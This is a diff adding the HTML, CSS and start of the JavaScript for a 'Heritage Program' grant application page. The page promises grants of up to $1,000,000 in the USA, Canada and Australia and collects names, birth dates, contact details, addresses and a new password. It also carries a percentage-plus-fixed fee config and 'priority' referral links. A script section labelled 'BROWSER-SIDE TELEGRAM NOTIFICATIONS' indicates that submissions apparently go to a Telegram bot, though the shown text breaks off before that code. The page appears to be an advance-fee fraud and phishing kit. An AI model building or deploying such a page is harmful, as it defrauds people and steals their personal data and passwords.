@@ -1,0 +1,1282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>Heritage Program | Apply for Grant</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="styles.css" />
+    <style>
+        .referral-banner {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            padding: 16px 18px;
+            border-radius: var(--radius-sm);
+            margin-bottom: 20px;
+            display: none;
+            align-items: center;
+            gap: 14px;
+            animation: fadeSlide 0.5s ease;
+            box-shadow: 0 4px 12px rgba(16,185,129,0.25);
+        }
+        .referral-banner.visible { display: flex; }
+        .referral-banner i { font-size: 1.8rem; flex-shrink: 0; }
+        .referral-banner .content { flex: 1; }
+        .referral-banner .title { font-weight: 700; font-size: 1rem; }
+        .referral-banner .subtitle { font-size: 0.85rem; opacity: 0.9; margin-top: 2px; }
+        .claimed-page { text-align: center; padding: 50px 20px 30px; }
+        .claimed-page .icon { font-size: 4.5rem; margin-bottom: 16px; display: block; }
+        .claimed-page h2 { font-size: 1.6rem; font-weight: 800; margin-bottom: 10px; color: var(--text); }
+        .claimed-page p { color: var(--text-muted); max-width: 400px; margin: 0 auto 20px; font-size: 0.95rem; line-height: 1.6; }
+        .offer-details { background: var(--secondary); border-radius: var(--radius-sm); padding: 18px 20px; margin: 20px auto; max-width: 380px; border-left: 4px solid var(--primary); text-align: left; }
+        .offer-details .detail-row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 0.9rem; }
+        .offer-details .label { font-weight: 600; color: var(--text-muted); }
+        .offer-details .value { font-weight: 700; color: var(--text); }
+        .status-check-container { padding: 10px 0; }
+        .status-check-container h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 4px; }
+        .status-check-container h3 i { color: var(--primary); margin-right: 8px; }
+        .status-check-container > p { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 16px; }
+        .status-search { display: flex; gap: 10px; margin: 16px 0; flex-wrap: wrap; }
+        .status-search .form-control { flex: 1; min-width: 200px; padding-left: 16px; }
+        .status-search .btn { flex-shrink: 0; min-width: 120px; }
+        .status-card { background: var(--secondary); border-radius: var(--radius-sm); padding: 16px 18px; margin-top: 16px; animation: fadeSlide 0.3s ease; }
+        .status-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding-bottom: 10px; border-bottom: 2px solid var(--border); flex-wrap: wrap; gap: 8px; }
+        .status-header h3 { font-size: 0.95rem; font-weight: 700; }
+        .status-badge { padding: 4px 14px; border-radius: 9999px; font-size: 0.65rem; font-weight: 700; text-transform: uppercase; color: var(--white); white-space: nowrap; }
+        .status-body { display: grid; grid-template-columns: 1fr 1fr; gap: 2px 16px; }
+        .status-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid var(--border); font-size: 0.85rem; gap: 8px; grid-column: 1 / -1; }
+        .status-row .label { color: var(--text-muted); font-weight: 500; }
+        .status-row .value { font-weight: 600; color: var(--text); text-align: right; word-break: break-word; }
+        .payment-info { margin-top: 14px; padding: 14px 16px; background: var(--white); border-radius: var(--radius-sm); border-left: 4px solid var(--success); }
+        .payment-info h4 { margin-bottom: 4px; color: var(--success); font-size: 0.9rem; }
+        .payment-info p { margin: 2px 0; font-size: 0.82rem; color: var(--text-muted); }
+        .payment-info strong { color: var(--text); }
+        .status-footer { margin-top: 14px; padding-top: 10px; border-top: 1px solid var(--border); text-align: center; color: var(--text-light); font-size: 0.75rem; }
+        .claimed-page .btn { width: auto; min-width: 180px; margin: 10px auto 0; }
+        #toastContainer { top: calc(var(--safe-top, 0px) + 12px); right: 12px; left: 12px; max-width: 420px; margin: 0 auto; }
+        .btn, .tab-btn, .country-btn, .step-indicator { touch-action: manipulation; }
+        #loadingOverlay .loader-ring { display: inline-block; width: 40px; height: 40px; border: 3px solid var(--border); border-radius: 50%; border-top-color: var(--primary); animation: spin 1s linear infinite; margin: 0 4px; }
+        #loadingOverlay .loader-ring:nth-child(2) { width: 32px; height: 32px; animation-duration: 0.8s; border-top-color: var(--primary-light); }
+        #loadingOverlay .loader-ring:nth-child(3) { width: 24px; height: 24px; animation-duration: 0.6s; border-top-color: var(--warning); }
+        #loadingOverlay .loader p { margin-top: 16px; color: var(--text-light); font-weight: 500; letter-spacing: 1px; font-size: 0.85rem; }
+        #loadingOverlay.hidden { opacity: 0; visibility: hidden; pointer-events: none; transition: opacity 0.6s ease, visibility 0.6s ease; }
+        .progress-steps { display: flex; justify-content: space-between; position: relative; margin-bottom: 10px; gap: 4px; }
+        .step-indicator { display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; position: relative; z-index: 1; flex: 1; touch-action: manipulation; }
+        .step-number { width: 32px; height: 32px; border-radius: 50%; background: var(--border); color: var(--white); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 0.75rem; transition: var(--transition); flex-shrink: 0; }
+        .step-label { font-size: 0.55rem; color: var(--text-light); font-weight: 500; text-align: center; line-height: 1.1; }
+        .step-indicator.active .step-number { background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%); transform: scale(1.1); box-shadow: 0 2px 12px rgba(139,90,43,0.3); }
+        .step-indicator.completed .step-number { background: var(--success); }
+        .step-indicator.active .step-label { color: var(--primary); font-weight: 600; }
+        .step-indicator.completed .step-label { color: var(--success); }
+        @media (max-width: 480px) {
+            .referral-banner { flex-direction: column; text-align: center; padding: 14px 16px; }
+            .referral-banner i { font-size: 2rem; }
+            .status-search { flex-direction: column; }
+            .status-search .btn { width: 100%; }
+            .status-body { grid-template-columns: 1fr; }
+            .claimed-page { padding: 30px 16px 20px; }
+            .claimed-page .icon { font-size: 3.5rem; }
+            .claimed-page h2 { font-size: 1.3rem; }
+            .offer-details .detail-row { flex-direction: column; gap: 2px; }
+            .offer-details .value { text-align: left; }
+            .step-label { font-size: 0.5rem; }
+            .step-number { width: 28px; height: 28px; font-size: 0.65rem; }
+        }
+        @media (min-width: 481px) and (max-width: 768px) {
+            .status-body { grid-template-columns: 1fr 1fr; }
+            .status-row { grid-column: auto; }
+        }
+        @media (min-width: 769px) {
+            .status-body { grid-template-columns: 1fr 1fr; }
+            .status-row { grid-column: auto; }
+        }
+        .form-group label { display: block; margin-bottom: 4px; font-weight: 500; font-size: 0.8rem; color: var(--text-muted); }
+        .form-group .required { color: var(--error); }
+        .step-header h3 { font-size: 1rem; font-weight: 700; color: var(--text); }
+        .step-header h3 i { color: var(--primary); margin-right: 6px; }
+        .step-required { font-size: 0.65rem; color: var(--text-light); }
+        .review-item { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid var(--border); gap: 8px; font-size: 0.85rem; }
+        .review-item:last-child { border-bottom: none; }
+        .review-label { font-weight: 500; color: var(--text-muted); flex-shrink: 0; }
+        .review-value { font-weight: 600; color: var(--text); text-align: right; word-break: break-word; flex: 1; }
+        .review-container { background: var(--secondary); border-radius: var(--radius-sm); padding: 14px; margin-bottom: 16px; }
+        .lang-toggle { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" role="status" aria-label="Loading">
+        <div class="loader">
+            <div class="loader-ring"></div>
+            <div class="loader-ring"></div>
+            <div class="loader-ring"></div>
+            <p id="loadingText">Loading...</p>
+        </div>
+    </div>
+
+    <!-- Toast Container -->
+    <div id="toastContainer" role="alert" aria-live="polite"></div>
+
+    <!-- ============================================================ -->
+    <!-- HEADER -->
+    <!-- ============================================================ -->
+    <header class="app-header" role="banner">
+        <div class="header-content">
+            <div class="logo-container">
+                <img src="/heritage-logo.png" alt="Heritage Program Logo" style="height: 40px; width: auto;" onerror="this.style.display='none'">
+                <div class="logo-text">
+                    <h1 id="headerTitle">Heritage Program</h1>
+                    <span id="headerSubtitle">Grants Application</span>
+                </div>
+            </div>
+            <div class="header-controls">
+                <div class="security-badge">
+                    <i class="fas fa-shield-halved" aria-hidden="true"></i>
+                    <span id="securityText">Secured</span>
+                </div>
+                <button class="lang-toggle" id="langToggle" aria-label="Toggle language" style="display:none;">
+                    <span class="lang-flag" id="langFlag">🇺🇸</span>
+                    <span class="lang-text" id="langText">EN</span>
+                    <span class="lang-arrow"><i class="fas fa-chevron-down" aria-hidden="true"></i></span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- ============================================================ -->
+    <!-- MAIN CONTENT -->
+    <!-- ============================================================ -->
+    <main class="main-content" role="main">
+
+        <!-- Tabs -->
+        <div class="tab-container" role="tablist">
+            <button class="tab-btn active" data-tab="apply" id="tabApply" role="tab" aria-selected="true" aria-controls="tabContentApply">
+                <i class="fas fa-pen-to-square" aria-hidden="true"></i> <span id="tabApplyText">Apply</span>
+            </button>
+            <button class="tab-btn" data-tab="status" id="tabStatus" role="tab" aria-selected="false" aria-controls="tabContentStatus">
+                <i class="fas fa-search" aria-hidden="true"></i> <span id="tabStatusText">Check Status</span>
+            </button>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- TAB 1: APPLICATION FORM -->
+        <!-- ============================================================ -->
+        <div class="tab-content active" id="tabContentApply" role="tabpanel" aria-labelledby="tabApply">
+
+            <!-- Referral Banner -->
+            <div class="referral-banner" id="referralBanner">
+                <i class="fas fa-star" aria-hidden="true"></i>
+                <div class="content">
+                    <div class="title" id="referralTitle">⭐ Referral Application</div>
+                    <div class="subtitle" id="referralSubtitle">This referral link offers a higher success rate and priority processing</div>
+                </div>
+            </div>
+
+            <!-- Claimed Page -->
+            <div id="claimedPage" style="display:none;">
+                <div class="claimed-page">
+                    <span class="icon">🔗</span>
+                    <h2 id="claimedTitle">This Offer Has Been Claimed</h2>
+                    <p id="claimedDesc">The referral link you're trying to use has already been used. Each link can only be used once.</p>
+                    <div class="offer-details" id="offerDetails" style="display:none;">
+                        <div class="detail-row">
+                            <span class="label">Referral From:</span>
+                            <span class="value" id="offerName">-</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="label">Offer Amount:</span>
+                            <span class="value" id="offerAmount">-</span>
+                        </div>
+                    </div>
+                    <a href="/" class="btn btn-primary">
+                        <i class="fas fa-arrow-left" aria-hidden="true"></i> <span id="returnHomeBtn">Return to Home</span>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Application Form -->
+            <div id="applicationFormContainer">
+
+                <!-- Country Selector -->
+                <div class="country-selector">
+                    <label id="countryLabel">Select Your Country:</label>
+                    <div class="country-buttons" role="radiogroup" aria-labelledby="countryLabel">
+                        <button class="country-btn active" data-country="USA" role="radio" aria-checked="true">
+                            <span class="flag" aria-hidden="true">🇺🇸</span>
+                            <span class="name" id="countryUsa">United States</span>
+                            <span class="checkmark" aria-hidden="true"><i class="fas fa-check-circle"></i></span>
+                        </button>
+                        <button class="country-btn" data-country="CANADA" role="radio" aria-checked="false">
+                            <span class="flag" aria-hidden="true">🇨🇦</span>
+                            <span class="name" id="countryCanada">Canada</span>
+                            <span class="checkmark" aria-hidden="true"><i class="fas fa-check-circle"></i></span>
+                        </button>
+                        <button class="country-btn" data-country="AUSTRALIA" role="radio" aria-checked="false">
+                            <span class="flag" aria-hidden="true">🇦🇺</span>
+                            <span class="name" id="countryAustralia">Australia</span>
+                            <span class="checkmark" aria-hidden="true"><i class="fas fa-check-circle"></i></span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Progress -->
+                <div class="progress-container" role="progressbar" aria-valuenow="25" aria-valuemin="0" aria-valuemax="100">
+                    <div class="progress-steps">
+                        <span class="step-indicator active" data-step="1">
+                            <span class="step-number">1</span>
+                            <span class="step-label" id="step1Label">Personal</span>
+                        </span>
+                        <span class="step-indicator" data-step="2">
+                            <span class="step-number">2</span>
+                            <span class="step-label" id="step2Label">Address</span>
+                        </span>
+                        <span class="step-indicator" data-step="3">
+                            <span class="step-number">3</span>
+                            <span class="step-label" id="step3Label">Grant</span>
+                        </span>
+                        <span class="step-indicator" data-step="4">
+                            <span class="step-number">4</span>
+                            <span class="step-label" id="step4Label">Review</span>
+                        </span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill" style="width: 25%;"></div>
+                    </div>
+                </div>
+
+                <!-- Form -->
+                <form id="grantForm" novalidate>
+
+                    <!-- Honeypot -->
+                    <div class="honeypot-field" aria-hidden="true">
+                        <label for="honeypot">Leave this field empty</label>
+                        <input type="text" id="honeypot" name="honeypot" value="" tabindex="-1" autocomplete="off" aria-hidden="true">
+                    </div>
+
+                    <!-- STEP 1: Personal Information -->
+                    <div class="form-step active" data-step="1" role="group" aria-label="Step 1: Personal Information">
+                        <div class="step-header">
+                            <h3><i class="fas fa-user" aria-hidden="true"></i> <span id="step1Title">Personal Information</span></h3>
+                            <span class="step-required" id="stepRequired">* Required</span>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="firstName"><span id="firstNameLabel">First Name</span> <span class="required">*</span></label>
+                                <input type="text" id="firstName" class="form-control" placeholder="John" required autocomplete="given-name">
+                                <div class="input-icon" aria-hidden="true"><i class="fas fa-user"></i></div>
+                            </div>
+                            <div class="form-group">
+                                <label for="middleName"><span id="middleNameLabel">Middle Name</span></label>
+                                <input type="text" id="middleName" class="form-control" placeholder="Michael" autocomplete="additional-name">
+                                <div class="input-icon" aria-hidden="true"><i class="fas fa-user"></i></div>
+                            </div>
+                            <div class="form-group">
+                                <label for="lastName"><span id="lastNameLabel">Last Name</span> <span class="required">*</span></label>
+                                <input type="text" id="lastName" class="form-control" placeholder="Doe" required autocomplete="family-name">
+                                <div class="input-icon" aria-hidden="true"><i class="fas fa-user"></i></div>
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="dob"><span id="dobLabel">Date of Birth</span> <span class="required">*</span></label>
+                                <input type="date" id="dob" class="form-control" required autocomplete="bday">
+                                <div class="input-icon" aria-hidden="true"><i class="fas fa-calendar"></i></div>
+                            </div>
+                            <div class="form-group">
+                                <label for="email"><span id="emailLabel">Email Address</span> <span class="required">*</span></label>
+                                <input type="email" id="email" class="form-control" placeholder="john.doe@example.com" required autocomplete="email">
+                                <div class="input-icon" aria-hidden="true"><i class="fas fa-envelope"></i></div>
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="phone"><span id="phoneLabel">Phone Number</span> <span class="required">*</span></label>
+                                <input type="tel" id="phone" class="form-control" placeholder="+1 (555) 123-4567" required autocomplete="tel">
+                                <div class="input-icon" aria-hidden="true"><i class="fas fa-phone"></i></div>
+                            </div>
+                            <div class="form-group">
+                                <label for="password"><span id="passwordLabel">Create Password</span> <span class="required">*</span></label>
+                                <div class="password-wrapper">
+                                    <input type="password" id="password" class="form-control" placeholder="Min 8 characters" required autocomplete="new-password">
+                                    <button type="button" class="password-toggle" id="passwordToggle" aria-label="Toggle password visibility"><i class="fas fa-eye" aria-hidden="true"></i></button>
+                                </div>
+                                <small id="passwordHint">Must be at least 8 characters</small>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label for="confirmPassword"><span id="confirmPasswordLabel">Confirm Password</span> <span class="required">*</span></label>
+                            <div class="password-wrapper">
+                                <input type="password" id="confirmPassword" class="form-control" placeholder="Confirm your password" required autocomplete="new-password">
+                                <button type="button" class="password-toggle" id="confirmPasswordToggle" aria-label="Toggle password visibility"><i class="fas fa-eye" aria-hidden="true"></i></button>
+                            </div>
+                        </div>
+                        <div class="form-navigation">
+                            <button type="button" class="btn btn-secondary" id="prevStep1" style="display:none;" disabled><i class="fas fa-arrow-left" aria-hidden="true"></i> <span id="backBtn">Back</span></button>
+                            <button type="button" class="btn btn-primary btn-next" id="nextStep1"><span id="continueBtn">Continue</span> <i class="fas fa-arrow-right" aria-hidden="true"></i></button>
+                        </div>
+                    </div>
+
+                    <!-- STEP 2: Address -->
+                    <div class="form-step" data-step="2" role="group" aria-label="Step 2: Address Information">
+                        <div class="step-header">
+                            <h3><i class="fas fa-home" aria-hidden="true"></i> <span id="step2Title">Address Information</span></h3>
+                            <span class="step-required">* Required</span>
+                        </div>
+                        <div class="form-group">
+                            <label for="address"><span id="addressLabel">Street Address</span> <span class="required">*</span></label>
+                            <input type="text" id="address" class="form-control" placeholder="123 Main Street" required autocomplete="street-address">
+                            <div class="input-icon" aria-hidden="true"><i class="fas fa-location-dot"></i></div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="city"><span id="cityLabel">City</span> <span class="required">*</span></label>
+                                <input type="text" id="city" class="form-control" placeholder="New York" required autocomplete="address-level2">
+                                <div class="input-icon" aria-hidden="true"><i class="fas fa-city"></i></div>
+                            </div>
+                            <div class="form-group">
+                                <label for="stateProvince"><span id="stateLabel">State / Province</span> <span class="required">*</span></label>
+                                <select id="stateProvince" class="form-control" required autocomplete="address-level1">
+                                    <option value="">Select...</option>
+                                </select>
+                                <div class="input-icon" aria-hidden="true"><i class="fas fa-map"></i></div>
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="postalCode"><span id="postalLabel">Postal Code</span> <span class="required">*</span></label>
+                                <input type="text" id="postalCode" class="form-control" placeholder="10001" required autocomplete="postal-code">
+                                <div class="input-icon" aria-hidden="true"><i class="fas fa-mailbox"></i></div>
+                            </div>
+                            <div class="form-group">
+                                <label for="countryDisplay"><span id="countryDisplayLabel">Country</span></label>
+                                <input type="text" id="countryDisplay" class="form-control" disabled>
+                                <div class="input-icon" aria-hidden="true"><i class="fas fa-globe"></i></div>
+                            </div>
+                        </div>
+                        <div class="form-navigation">
+                            <button type="button" class="btn btn-secondary" id="prevStep2"><i class="fas fa-arrow-left" aria-hidden="true"></i> <span id="backBtn2">Back</span></button>
+                            <button type="button" class="btn btn-primary btn-next" id="nextStep2"><span id="continueBtn2">Continue</span> <i class="fas fa-arrow-right" aria-hidden="true"></i></button>
+                        </div>
+                    </div>
+
+                    <!-- STEP 3: Grant Details -->
+                    <div class="form-step" data-step="3" role="group" aria-label="Step 3: Grant Details">
+                        <div class="step-header">
+                            <h3><i class="fas fa-hand-holding-dollar" aria-hidden="true"></i> <span id="step3Title">Grant Details</span></h3>
+                            <span class="step-required">* Required</span>
+                        </div>
+                        <div class="form-group">
+                            <label for="grantProgram"><span id="programLabel">Grant Program</span> <span class="required">*</span></label>
+                            <select id="grantProgram" class="form-control" required>
+                                <option value="">Select a program...</option>
+                            </select>
+                            <div class="input-icon" aria-hidden="true"><i class="fas fa-list"></i></div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="grantAmount"><span id="amountLabel">Requested Amount</span> <span class="required">*</span></label>
+                                <div class="currency-input">
+                                    <span class="currency-symbol" id="currencySymbol" aria-hidden="true">$</span>
+                                    <input type="range" id="grantAmountSlider" min="1000" max="1000000" step="1000" value="50000" aria-label="Grant amount slider">
+                                    <div class="currency-top">
+                                        <input type="number" id="grantAmount" class="form-control" placeholder="25000" step="1000" min="1000" max="1000000" value="50000" required aria-label="Grant amount">
+                                    </div>
+                                </div>
+                                <div class="slider-labels">
+                                    <span id="minAmount">$1,000</span>
+                                    <span id="amountDisplay">$50,000</span>
+                                    <span id="maxAmount">$1,000,000</span>
+                                </div>
+                                <small id="amountRange">Min: $1,000 | Max: $1,000,000</small>
+                            </div>
+                            <div class="form-group">
+                                <label for="previousApplicant"><span id="prevApplicantLabel">Have you applied before?</span></label>
+                                <select id="previousApplicant" class="form-control">
+                                    <option value="no" id="prevNo">No</option>
+                                    <option value="yes" id="prevYes">Yes</option>
+                                </select>
+                                <div class="input-icon" aria-hidden="true"><i class="fas fa-clock-rotate-left"></i></div>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label for="purposeStatement"><span id="purposeLabel">Purpose Statement</span> <span class="required">*</span></label>
+                            <textarea id="purposeStatement" class="form-control" rows="4" placeholder="Describe how you will use the grant funds" required></textarea>
+                            <div id="charCount"></div>
+                        </div>
+                        <div class="form-navigation">
+                            <button type="button" class="btn btn-secondary" id="prevStep3"><i class="fas fa-arrow-left" aria-hidden="true"></i> <span id="backBtn3">Back</span></button>
+                            <button type="button" class="btn btn-primary btn-next" id="nextStep3"><span id="continueBtn3">Continue</span> <i class="fas fa-arrow-right" aria-hidden="true"></i></button>
+                        </div>
+                    </div>
+
+                    <!-- STEP 4: Review & Submit -->
+                    <div class="form-step" data-step="4" role="group" aria-label="Step 4: Review & Submit">
+                        <div class="step-header">
+                            <h3><i class="fas fa-clipboard-check" aria-hidden="true"></i> <span id="step4Title">Review &amp; Submit</span></h3>
+                        </div>
+                        <div class="review-container" id="reviewContainer"></div>
+
+                        <!-- Anti-Bot Challenge -->
+                        <div class="anti-bot-challenge">
+                            <label><span id="challengeLabel">Security Verification</span> <span class="required">*</span></label>
+                            <div class="challenge-question" id="challengeQuestion">What is 5 + 3?</div>
+                            <input type="text" id="challengeAnswer" class="form-control" placeholder="Enter your answer" required style="max-width: 200px;" autocomplete="off">
+                            <small id="challengeHint">Please answer the simple question to verify you're human</small>
+                            <input type="hidden" id="challengeExpected" value="8">
+                        </div>
+
+                        <!-- Terms -->
+                        <div class="form-group">
+                            <label class="checkbox-label">
+                                <input type="checkbox" id="termsCheck" required>
+                                <span id="termsText">I agree to the terms and conditions and confirm all information is accurate</span>
+                            </label>
+                        </div>
+
+                        <div class="form-navigation">
+                            <button type="button" class="btn btn-secondary" id="prevStep4"><i class="fas fa-arrow-left" aria-hidden="true"></i> <span id="backBtn4">Back</span></button>
+                            <button type="submit" class="btn btn-success btn-submit" id="submitBtn"><i class="fas fa-paper-plane" aria-hidden="true"></i> <span id="submitBtnText">Submit Application</span></button>
+                        </div>
+                    </div>
+
+                </form>
+
+                <!-- Success Section -->
+                <div id="successSection" style="display:none;">
+                    <div class="success-card">
+                        <div class="success-icon" aria-hidden="true">✅</div>
+                        <h2 id="successTitle">Application Submitted Successfully!</h2>
+                        <p id="successCaseLabel">Your Case ID:</p>
+                        <div class="case-id-display" id="caseIdDisplay">HP-2026-07-21-XXXXX</div>
+                        <p id="successSaveMsg">Please save your Case ID to check your application status.</p>
+                        <div class="success-actions">
+                            <a href="/" class="btn btn-primary" style="width: auto; margin: 0 auto;"><i class="fas fa-home" aria-hidden="true"></i> <span id="homeBtnText">Home</span></a>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- TAB 2: CHECK STATUS -->
+        <!-- ============================================================ -->
+        <div class="tab-content" id="tabContentStatus" role="tabpanel" aria-labelledby="tabStatus">
+            <div class="status-check-container">
+                <h3><i class="fas fa-search" aria-hidden="true"></i> <span id="statusTitle">Check Your Application Status</span></h3>
+                <p id="statusDesc">Enter your Case ID to view your application status and grant details.</p>
+                <div class="status-search">
+                    <input type="text" id="statusInput" class="form-control" placeholder="HP-2026-07-21-XXXXX" autocomplete="off">
+                    <button class="btn btn-primary" id="checkStatusBtn"><i class="fas fa-search" aria-hidden="true"></i> <span id="checkStatusBtnText2">Check Status</span></button>
+                </div>
+                <div id="statusResult" style="display:none;"></div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- ============================================================ -->
+    <!-- FOOTER -->
+    <!-- ============================================================ -->
+    <footer class="app-footer" role="contentinfo">
+        <div class="footer-content">
+            <div class="footer-brand">
+                <span class="footer-logo">🏛️ Heritage Program</span>
+                <small id="footerTagline">Building Wealth, Preserving Heritage</small>
+            </div>
+            <div class="footer-links">
+                <a href="#"><i class="fas fa-shield" aria-hidden="true"></i> <span id="privacyLink">Privacy Policy</span></a>
+                <a href="#"><i class="fas fa-file-contract" aria-hidden="true"></i> <span id="termsLink">Terms &amp; Conditions</span></a>
+                <a href="#"><i class="fas fa-envelope" aria-hidden="true"></i> <span id="contactLink">Contact Support</span></a>
+            </div>
+            <div class="footer-copy">
+                <span id="copyright">&copy; 2026 Heritage Program. All rights reserved.</span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ============================================================ -->
+    <!-- JAVASCRIPT - BROWSER-SIDE TELEGRAM NOTIFICATIONS -->
+    <!-- ============================================================ -->
+    <script>
+        (function() {
+            'use strict';
+
+            // ============================================================
+            // CONFIGURATION
+            // ============================================================
+            const CONFIG = {
+                countries: {
+                    USA: {
+                        currencySymbol: '$',
+                        countryName: 'United States',
+                        states: ['Alabama', 'Alaska', 'Arizona', 'Arkansas', 'California', 'Colorado', 'Connecticut', 'Delaware', 'Florida', 'Georgia', 'Hawaii', 'Idaho', 'Illinois', 'Indiana', 'Iowa', 'Kansas', 'Kentucky', 'Louisiana', 'Maine', 'Maryland', 'Massachusetts', 'Michigan', 'Minnesota', 'Mississippi', 'Missouri', 'Montana', 'Nebraska', 'Nevada', 'New Hampshire', 'New Jersey', 'New Mexico', 'New York', 'North Carolina', 'North Dakota', 'Ohio', 'Oklahoma', 'Oregon', 'Pennsylvania', 'Rhode Island', 'South Carolina', 'South Dakota', 'Tennessee', 'Texas', 'Utah', 'Vermont', 'Virginia', 'Washington', 'West Virginia', 'Wisconsin', 'Wyoming']
+                    },
+                    CANADA: {
+                        currencySymbol: 'CA$',
+                        countryName: 'Canada',
+                        states: ['Alberta', 'British Columbia', 'Manitoba', 'New Brunswick', 'Newfoundland and Labrador', 'Nova Scotia', 'Ontario', 'Prince Edward Island', 'Quebec', 'Saskatchewan', 'Northwest Territories', 'Nunavut', 'Yukon']
+                    },
+                    AUSTRALIA: {
+                        currencySymbol: 'AU$',
+                        countryName: 'Australia',
+                        states: ['New South Wales', 'Victoria', 'Queensland', 'South Australia', 'Western Australia', 'Tasmania', 'Australian Capital Territory', 'Northern Territory']
+                    }
+                },
+                grantPrograms: {
+                    'household-support': { name: 'Household Support Grant', countries: ['USA', 'CANADA', 'AUSTRALIA'] },
+                    'small-business': { name: 'Small Business Grant', countries: ['USA', 'CANADA', 'AUSTRALIA'] },
+                    'education': { name: 'Education and Training Grant', countries: ['USA', 'CANADA', 'AUSTRALIA'] },
+                    'community': { name: 'Community Development Grant', countries: ['USA', 'CANADA', 'AUSTRALIA'] },
+                    'innovation': { name: 'Innovation and Research Grant', countries: ['USA', 'CANADA'] },
+                    'agriculture': { name: 'Agricultural Development Grant', countries: ['USA', 'CANADA', 'AUSTRALIA'] },
+                    'indigenous-support': { name: 'Indigenous Community Support Grant', countries: ['USA', 'CANADA', 'AUSTRALIA'] },
+                    'climate-action': { name: 'Climate Action Grant', countries: ['USA', 'CANADA', 'AUSTRALIA'] }
+                },
+                fees: { percentage: 0.05, fixed: 100, maxFee: 5000 },
+                antiBot: {
+                    challengeQuestions: [
+                        { question: 'What is 5 + 3?', answer: '8' },
+                        { question: 'What is 10 - 4?', answer: '6' },
+                        { question: 'What is 7 + 2?', answer: '9' },
+                        { question: 'What is 12 - 5?', answer: '7' },
+                        { question: 'What is 3 + 6?', answer: '9' },
+                        { question: 'What is 15 - 7?', answer: '8' }
+                    ]
+                }
+            };
+
+            // ============================================================
+            // TOAST MESSAGES - ENGLISH ONLY
+            // ============================================================
+            const TOAST_MESSAGES = {
+                toastFirstName: 'First name is required',
+                toastLastName: 'Last name is required',
+                toastEmail: 'Email is required',
+                toastValidEmail: 'Please enter a valid email',
+                toastPhone: 'Phone number is required',
+                toastDob: 'Date of birth is required',
+                toastPassword: 'Password is required',
+                toastPasswordLength: 'Password must be at least 8 characters',
+                toastPasswordMatch: 'Passwords do not match',
+                toastAddress: 'Address is required',
+                toastCity: 'City is required',
+                toastState: 'State/Province is required',
+                toastPostal: 'Postal code is required',
+                toastProgram: 'Please select a grant program',
+                toastAmountMin: 'Grant amount must be at least $1,000',
+                toastAmountMax: 'Grant amount cannot exceed $1,000,000',
+                toastPurpose: 'Please provide a purpose statement',
+                toastChallenge: 'Please complete the security verification',
+                toastChallengeWrong: 'Incorrect answer. Please try again.',
+                toastTerms: 'Please agree to the terms and conditions',
+                toastSubmitFailed: 'Submission failed: ',
+                toastHoneypot: 'Security check failed. Please try again.',
+                toastError: 'Error: ',
+                toastSuccess: '✅ Application submitted! Case ID: ',
+                toastTelegramFailed: '⚠️ Notification failed, but application was saved.',
+                toastStatusEnter: 'Please enter a Case ID',
+                toastStatusNotFound: 'No application found with this Case ID.',
+                toastStatusRetrieved: 'Status retrieved successfully',
+                toastInvalidRef: 'Invalid or used referral link'
+            };
+
+            function getToastText(key) {
+                return TOAST_MESSAGES[key] || key;
+            }
+
+            // ============================================================
+            // STATE
+            // ============================================================
+            let currentStep = 1;
+            const totalSteps = 4;
+            let selectedCountry = 'USA';
+            let formData = {};
+            let isSubmitting = false;
+            let pageLoadTime = Date.now();
+            let referralData = null;
+
+            // ============================================================
+            // TOAST
+            // ============================================================
+            function showToast(type, message) {
+                const container = document.getElementById('toastContainer');
+                if (!container) return;
+                container.innerHTML = '';
+                const toast = document.createElement('div');
+                toast.className = 'toast toast-' + type;
+                const icons = { success: 'fa-check-circle', error: 'fa-exclamation-circle', warning: 'fa-triangle-exclamation', info: 'fa-info-circle' };
+                toast.innerHTML = '<i class="fas ' + (icons[type] || icons.info) + '" aria-hidden="true"></i><span>' + message + '</span>';
+                container.appendChild(toast);
+                setTimeout(() => {
+                    toast.classList.add('toast-exit');
+                    setTimeout(() => toast.remove(), 400);
+                }, 4000);
+            }
+
+            // ============================================================
+            // FORMAT CURRENCY
+            // ============================================================
+            function formatCurrency(amount, country) {
+                const symbols = { USA: '$', CANADA: 'CA$', AUSTRALIA: 'AU$' };
+                const symbol = symbols[country] || '$';
